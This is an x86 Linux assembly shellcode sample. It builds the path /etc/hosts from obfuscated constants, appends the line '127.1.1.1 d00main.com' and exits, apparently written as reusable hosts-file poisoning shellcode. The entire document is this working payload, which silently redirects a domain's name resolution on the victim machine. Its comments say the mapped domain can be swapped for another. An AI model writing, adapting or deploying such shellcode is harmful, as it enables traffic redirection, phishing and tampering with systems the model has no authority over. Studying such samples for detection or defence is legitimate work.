global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5
    push ecx
    mov esi, 0x84858480
    sub esi, 0x11111111
    mov dword [esp-4], esi
    mov esi, 0x460d0d0d
    add esi, 0x22222222
    mov dword [esp-8], esi
    mov esi, 0x304131fc
    add esi, 0x33333333
    mov dword [esp-12], esi
    sub esp, 12
    mov ebx, esp
    inc ecx
    mov ch,0x4
    int 0x80        ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 21         ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80        ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80        ;syscall to close the file

    push 0x1
    pop eax
    int 0x80        ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 d00main.com"
